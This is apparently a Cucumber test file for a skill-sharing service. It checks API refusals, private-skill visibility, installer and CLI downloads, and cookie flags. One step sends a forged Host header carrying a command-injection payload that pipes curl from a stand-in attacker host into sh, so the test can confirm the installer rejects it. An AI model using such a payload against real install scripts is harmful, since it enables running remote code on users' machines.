import { Then, When } from '@cucumber/cucumber';
import assert from 'node:assert/strict';
import http from 'node:http';
import type { SkillDetail } from '../api.js';
import { ShkillsWorld } from '../world.js';

/**
 * The few criteria that are about the service rather than a screen: what the
 * API refuses, and what a machine can download before it has a CLI at all.
 */

When(
  '{string} tries to approve the proposal for {string}',
  async function (this: ShkillsWorld, email: string, slug: string) {
    const curator = await this.as(this.curatorEmail());
    const { skill } = await curator.get<{ skill: SkillDetail }>(`/v1/skills/${slug}`);
    const pending = skill.versions.find((version) => version.status === 'pending');
    assert.ok(pending, `${slug} has nothing waiting for review`);

    const api = await this.as(email);
    this.lastApiAttempt = await api.attempt('POST', `/v1/skills/versions/${pending.id}/approve`);
  },
);

When(
  '{string} tries to leave the collection {string}',
  async function (this: ShkillsWorld, email: string, slug: string) {
    const api = await this.as(email);
    this.lastApiAttempt = await api.attempt('DELETE', `/v1/subscriptions/collection/${slug}`);
  },
);

When(
  '{string} tries to put {string} into the collection {string}',
  async function (this: ShkillsWorld, email: string, slug: string, collection: string) {
    const api = await this.as(email);
    this.lastApiAttempt = await api.attempt('PUT', `/v1/collections/${collection}/skills/${slug}`);
  },
);

/**
 * Asked as that person, and satisfied by a 404 rather than a 403: being told
 * "you may not see this" would confirm it is there, which is the one thing a
 * private skill must not do.
 */
Then(
  '{string} cannot see the skill {string}',
  async function (this: ShkillsWorld, email: string, slug: string) {
    const api = await this.as(email);
    const attempt = await api.attempt('GET', `/v1/skills/${slug}`);
    assert.equal(attempt.status, 404, `${email} can see "${slug}" after all (${attempt.status})`);
  },
);

Then('there is no skill called {string}', async function (this: ShkillsWorld, slug: string) {
  const api = await this.as(this.curatorEmail());
  const attempt = await api.attempt('GET', `/v1/skills/${slug}`);
  assert.equal(attempt.status, 404, `"${slug}" exists after all`);
});

Then('the server refuses, saying {string}', function (this: ShkillsWorld, expected: string) {
  const attempt = this.lastApiAttempt;
  assert.ok(attempt, 'nothing was attempted in this scenario');
  assert.ok(attempt.status >= 400, `the server allowed it (${attempt.status})`);
  assert.ok(
    attempt.error.includes(expected),
    `the server said "${attempt.error}" (${attempt.status}), not "${expected}"`,
  );
});

Then('the installer can be downloaded', async function (this: ShkillsWorld) {
  const response = await fetch(`${this.server.url}/install.sh`);
  assert.equal(response.status, 200, 'install.sh is not being served');
  const script = await response.text();
  assert.ok(script.includes('Shkills installer'), 'install.sh is not the installer');
  assert.ok(
    script.includes(this.server.url),
    'install.sh does not point back at this server, so an installed CLI would talk to the wrong one',
  );
});

/**
 * The installer names back the address in the request, so that header decides
 * what a `| sh` will talk to. `fetch` refuses to send a made-up Host at all,
 * hence the raw request: this has to be asked the way an attacker would ask it.
 */
Then('a made-up Host header cannot get into the installer', async function (this: ShkillsWorld) {
  const { port } = new URL(this.server.url);
  const script = await new Promise<string>((resolve, reject) => {
    const request = http.request(
      {
        host: '127.0.0.1',
        port,
        path: '/install.sh',
        setHost: false,
        headers: { Host: 'evil.example"; curl http://evil.example/x | sh; echo "' },
      },
      (response) => {
        let body = '';
        response.on('data', (chunk) => (body += String(chunk)));
        response.on('end', () => resolve(body));
      },
    );
    request.on('error', reject);
    request.end();
  });

  assert.ok(!script.includes('evil.example'), `the installer served:\n${script.slice(0, 400)}`);
  assert.ok(
    script.includes(this.server.url),
    'the installer fell back to something other than the configured address',
  );
});

Then('the CLI it downloads can be downloaded', async function (this: ShkillsWorld) {
  const bundle = await fetch(`${this.server.url}/cli/shkills.mjs`);
  assert.equal(bundle.status, 200, 'the CLI bundle is not being served');
  assert.ok((await bundle.text()).includes('shkills'), 'the CLI bundle looks empty');

  const version = await fetch(`${this.server.url}/cli/version`);
  assert.equal(version.status, 200, 'the CLI version endpoint is not being served');
  assert.match(await version.text(), /sha256/, 'the CLI version does not carry a checksum');
});

Then('the service reports itself healthy', async function (this: ShkillsWorld) {
  const response = await fetch(`${this.server.url}/api/health`);
  assert.equal(response.status, 200);
  assert.deepEqual(await response.json(), { ok: true, service: 'shkills' });
});

Then('the session cookie is not marked Secure', async function (this: ShkillsWorld) {
  // This deployment is plain HTTP; a Secure cookie would be dropped silently by
  // the browser and the portal would sign people in and out at the same time.
  const response = await fetch(`${this.server.url}/api/v1/auth/login`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      email: this.curatorEmail(),
      password: this.person(this.curatorEmail()).password,
    }),
  });
  const cookie = response.headers.get('set-cookie') ?? '';
  assert.ok(cookie.includes('HttpOnly'), `the session cookie is not HttpOnly: ${cookie}`);
  assert.ok(!/;\s*Secure/i.test(cookie), `the session cookie is marked Secure over http: ${cookie}`);
});
